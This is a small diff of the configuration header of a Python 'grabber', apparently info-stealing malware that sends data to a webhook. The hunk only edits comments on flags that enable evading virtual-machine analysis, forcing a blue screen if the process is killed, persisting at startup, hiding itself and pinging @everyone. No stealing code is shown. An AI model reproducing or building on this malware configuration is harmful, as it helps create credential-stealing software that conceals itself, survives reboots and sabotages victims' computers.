@@ -3,9 +3,9 @@
 
 WEBHOOK = "Do NOT Enter anything here! Enter your webhook in config.txt"
 PINGME = True # Pings @everyone
-VMPROTECT = True # Tries to protect your webhook from VMs
-BSOD = True # Tries to trigger Blue Screen if VM detected
-STARTUP = True # Puts the grabber in startup (and hide it)
+VMPROTECT = True # Tries to protect your grabber from VMs
+BSOD = True # Tries to trigger Blue Screen if grabber force exit
+STARTUP = True # Puts the grabber in startup
 HIDE_ITSELF = True # Hides the Grabber
 
 import os, sys
